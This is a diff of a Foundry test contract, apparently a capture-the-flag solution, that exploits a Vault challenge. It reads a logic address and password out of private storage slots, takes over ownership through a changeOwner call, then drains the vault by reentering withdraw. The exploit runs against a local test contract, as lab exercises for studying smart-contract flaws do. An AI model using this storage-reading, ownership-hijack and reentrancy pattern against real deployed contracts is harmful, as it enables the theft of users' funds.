@@ -18,7 +18,7 @@ contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
     address owner = address(1);
-    address palyer = address(2);
+    address palyer = address(this);
     bool reenter = true;
 
     // Fallback function to receive Ether from the Vault and reenter `withdraw`
@@ -56,6 +56,8 @@ contract VaultExploiter is Test {
      * 重入攻击
      */
     function testExploit() public {
+        vm.deal(palyer, 1 ether);
+        vm.startPrank(palyer);
         // 获取logic地址
         address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
         console.log("logicAddress", logicAddress);
@@ -64,14 +66,13 @@ contract VaultExploiter is Test {
         bytes32 password = vm.load(logicAddress, bytes32(uint256(1)));
         assertEq(password, "0x1234");
 
-        //vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
         // 调用changeOwner函数
         address owner = vault.owner();
 
         // 修改owner
         callChangeOwner(vault, bytes32(uint256(uint160(address(logicAddress)))), palyer);
         assertEq(vault.owner(), palyer);
+
         // 打开提现
         vault.openWithdraw();
         assertEq(vault.canWithdraw(), true);
@@ -81,10 +82,7 @@ contract VaultExploiter is Test {
         vm.stopPrank();
 
         // 执行重入
-        vm.deal(address(this), 1 ether);
-        vm.prank(address(this));
         vault.deposite{value: 1 ether}();
-        vm.prank(address(this));
         vault.withdraw();
         assertEq(address(vault).balance, 0);
         require(vault.isSolve(), "solved");
